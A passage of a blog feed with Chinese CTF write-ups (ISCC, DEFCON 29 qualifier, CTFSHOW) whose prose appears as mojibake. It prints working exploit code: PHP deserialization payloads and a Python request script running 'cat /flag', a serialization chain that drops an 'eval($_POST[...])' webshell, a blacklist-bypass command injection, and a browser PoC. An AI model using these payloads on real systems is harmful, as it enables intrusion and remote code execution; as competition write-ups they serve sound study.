class="comment">//var_dump(unserialize(urldecode(&#x27;O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;)));</span></span><br></pre></td></tr></table></figure><p><code>poc2</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Upload(),</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_ResetCMD(),</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>=&gt;<span class="keyword">new</span> ISCC_Command(),</span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span>=urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%20&quot;</span>,str_replace(<span class="string">&quot;\\2A&quot;</span>,<span class="string">&quot;%5C2A&quot;</span>,str_replace(<span class="string">&quot;\\00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,urldecode(str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;%5C2A&#x27;</span>,str_replace(<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;%5C00&quot;</span>,<span class="variable">$b</span>)))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.96.91.106:7050/&#x27;</span> + <span class="string">&#x27;?%3F=O:10:&quot;ISCC_Login&quot;:3:&#123;S:1:&quot;b&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;c&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;S:1:&quot;a&quot;;O:11:&quot;ISCC_Upload&quot;:2:&#123;S:1:&quot;e&quot;;O:13:&quot;ISCC_ReSetCMD&quot;:1:&#123;S:10:&quot;%5C00%5C2A%5C00new_cmd&quot;;S:9:&quot;cat%20/flag&quot;;&#125;S:1:&quot;d&quot;;O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">f = (<span class="string">&quot;isccIsCciScc1scc&quot;</span>, <span class="string">&quot;Du1&quot;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;git.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">files = &#123;<span class="string">&quot;_SESSION&quot;</span>: f, <span class="string">&quot;iscc_file&quot;</span>: f1&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/05/8WQS5DsKVhRuN3X.png"></p><p>flag å‡ºï¼š<code>ISCC&#123;hjh_Y0u_sT1ll_D0nt_KNoW_wHiCH_ONe_is_true!:P&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_DEFCON_29_CTF_Qualifier_WP</title>
      <link href="2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/"/>
      <url>2021/05/04/2021-DEFCON-29-CTF-Qualifier-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€çš„æ—¶å€™ä¹Ÿé¡ºä¾¿çœ‹äº†çœ‹ DEFCONï¼Œåæ¥ @ç‹ ç‹  è¦æˆ‘å¸®å¿™æ•´ç†ä¸€ä¸‹ pwn é¢˜é™„ä»¶çš„æ—¶å€™æ‰å‘ç°ä¸€ä»¶äº‹ï¼Œpwn é¢˜ä¸€å…±æœ‰ 15 é“ï¼Œå†çœ‹çœ‹ webï¼Œæ¯”èµ›æ‰“åˆ°ä¸€åŠçš„æ—¶å€™æ‰ä¸Šä¸€é“ï¼Œä¹Ÿæ˜¯å”¯ä¸€ä¸€é“ï¼Œå®³ã€‚</p><p><img src="https://i.loli.net/2021/05/04/qsEpu2v6wOnTPL3.png"></p><p>è·Ÿç€å›½å¤–å¤§ä½¬çš„ wp å¤ç°äº†ä¸€ä¸‹ã€‚</p><h2 id="threefactooorx"><a href="#threefactooorx" class="headerlink" title="threefactooorx"></a>threefactooorx</h2><ul><li><p><a href="https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/">https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/</a></p></li><li><p><a href="https://graneed.hatenablog.com/entry/2021/05/03/091823">https://graneed.hatenablog.com/entry/2021/05/03/091823</a></p></li></ul><p>åªæ˜¯è·Ÿç€å¤ç°äº†ä¸€ä¸‹ï¼Œæ”¹å¤©å†è¯¦ç»†è¡¥ä¸€ä¸‹ï¼ˆç»å…¸å·æ‡’</p><p>ä¸»è¦è€ƒç‚¹æ˜¯ js æ··æ·†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;3fa&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c1);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c2);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c3 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c3);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c4 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c4);</span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> c5 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line">  p.append(c5);</span><br><span class="line">  p.removeChild(c1);</span><br><span class="line">  p.removeChild(c2);</span><br><span class="line">  p.removeChild(c3);</span><br><span class="line"><span class="javascript">  c4.setAttribute(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,<span class="string">&quot;1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901&quot;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;thirdfactooor&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;40&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;3fa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>init();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æäº¤å³è·å¾— flagï¼š<code>000&#123;themorefactorsthebetter_butyouneedatleastthree&#125;</code></p><p><img src="https://i.loli.net/2021/05/04/tRiqf6LsFH9PMGe.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CTFSHOW_å¤§ç‰›æ¯_WP</title>
      <link href="2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/"/>
      <url>2021/05/03/2021-CTFSHOW-%E5%A4%A7%E7%89%9B%E6%9D%AF-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€çœ‹äº†ä¸‹ ctfshow çš„å¤§ç‰›æ¯ï¼Œweb é¢˜è´¨é‡æŒºé«˜çš„ï¼Œæœ‰çš„é¢˜å½“æ—¶ä¸ä¼šï¼Œç°åœ¨å¤ç°ä¸€ä¸‹å§ã€‚</p><h2 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h2><p>é¢˜ç›®æºç å·²ç»ç»™å‡ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-04-22 17:44:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-04-26 11:30:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;display_errors&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;allow_url_fopen&#x27;</span>=&gt;<span class="string">&#x27;On&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;settings <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            ini_set(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;settings.inc&#x27;</span>, unserialize(<span class="keyword">$this</span>-&gt;params));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>åœ¨ <a href="https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func">php manual</a> é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„å˜é‡é…ç½®ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œå¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼Œæœ€å…³é”®çš„æ˜¯è¿™ä¸ªé…ç½®æ˜¯ PHP_IN_ALL çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ ini_set æ¥è®¾ç½®</p><p><img src="https://i.loli.net/2021/05/03/PTqCp6XVEn7AQHv.png"></p><p>å¯ä»¥é€šè¿‡ spl_autoload æ¥è‡ªåŠ¨åŠ è½½æœªå®šä¹‰çš„ç±» settingsï¼Œä¼šé»˜è®¤åŠ è½½å½“å‰ç›®å½•ä¸‹ï¼Œä»¥settingsç±»åä¸ºæ–‡ä»¶åï¼Œphp æˆ–è€… inc ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œè¿™æ ·å°±å’Œ settings.inc è”ç³»åˆ°äº†ä¸€èµ·</p><p><img src="https://i.loli.net/2021/05/03/zYaB4UMjZGuyNWw.png"></p><p><img src="https://i.loli.net/2021/05/03/8ZX2MJj47DwySoq.png"></p><p>æ•…æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨ array ååºåˆ—åŒ–å»å†™ä¸€ä¸ªğŸåˆ° settings.inc ä¸­ï¼Œç„¶ååŠ è½½å®ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">settings</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$settings</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;settings=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;unserialize_callback_func&#x27;</span>=&gt;<span class="string">&#x27;spl_autoload&#x27;</span></span><br><span class="line">        );</span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">new</span> settings());  <span class="comment">/* è®¾ç½®æœªå®šä¹‰ç±» settings */</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;params=serialize(<span class="keyword">array</span>(<span class="string">&quot;&lt;?php file_put_contents(&#x27;Du1.php&#x27;, &#x27;&lt;?php eval(\$_POST[Du1]);phpinfo();&#x27;);&quot;</span>));  <span class="comment">/* å†™ğŸ */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> main()));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/iH3UbY7pvdxM6Ck.png"></p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>å¥½å®¶ä¼™ï¼Œè¿™é¢˜è¿˜æœ‰éé¢„æœŸï¼Œåˆ©ç”¨ error_logã€unserialize_callback_func å’Œ html_error å†™ğŸï¼Œæ”¹å¤©å¤ç°ä¸€ä¸‹å§ã€‚</p><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>è¿™é¢˜å½“æ—¶å¸ˆå‚…ä»¬éƒ½æ²¡çœ‹ï¼Œè¿æ°”å¥½æ‹¿äº†ä¸ªä¸€è¡€ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//flag in /</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_letter</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$letter_blacklist</span> = str_split(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$letter_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$letter_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_character</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$character_blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$character_blacklist</span>); <span class="variable">$i</span>+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&quot;</span>.<span class="variable">$character_blacklist</span>[<span class="variable">$i</span>].<span class="string">&quot;/&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;tongtong xi nei~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = substr(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    check_letter(<span class="variable">$code</span>);</span><br><span class="line">    check_character(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="variable">$fuxkfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶çœ‹èµ·æ¥è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯è¿˜æ˜¯ç•™äº†å¾ˆå¤šå¯ç”¨å­—ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdfhjlnprtvxz24680</span><br><span class="line">&#x3D; % ) * ^ $ &#96; ! ] &#125; &#39; ; &#x2F; ? &lt; &gt;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å››å­—å‘½ä»¤æ‰§è¡Œã€‚ã€‚ã€‚ç»“æœå‘ç° nl å°±å®Œäº‹äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;nl%09&#x2F;*&#96;</span><br></pre></td></tr></table></figure><p>å¬å¸ˆå‚…è¯´ nl å¯ä»¥æ¢æˆ prï¼Œä½†æ˜¯æ²¡æµ‹è¯•æˆåŠŸï¼ˆç–‘æƒ‘</p><h2 id="RealWorld-CyberShow"><a href="#RealWorld-CyberShow" class="headerlink" title="RealWorld_CyberShow"></a>RealWorld_CyberShow</h2><p>åƒæ˜¯è¦çˆ†ç ´ï¼Œä½†æ˜¯ä¸çŸ¥é“ enpwd å’Œ key æ˜¯æ€ä¹ˆå¾—å‡ºæ¥çš„ï¼Œç­‰ä¸€æ³¢è¯¦ç»†wp</p><h2 id="easy-CMS"><a href="#easy-CMS" class="headerlink" title="easy CMS"></a>easy CMS</h2><p>å‡ºæ˜¯å‡ºäº†ï¼Œä½†æ˜¯æ„Ÿè§‰å‘³é“ä¸å¤ªå¯¹ï¼Œæ‰€ä»¥æ‰“ç®—è‡ªå·±å»å®¡ä¸€å®¡æè‡´çš„æºç å†å›æ¥è¡¥å‘ - -</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Blue_Hat_WP</title>
      <link href="2021/04/29/2021-Blue-Hat-WP/"/>
      <url>2021/04/29/2021-Blue-Hat-WP/</url>
      
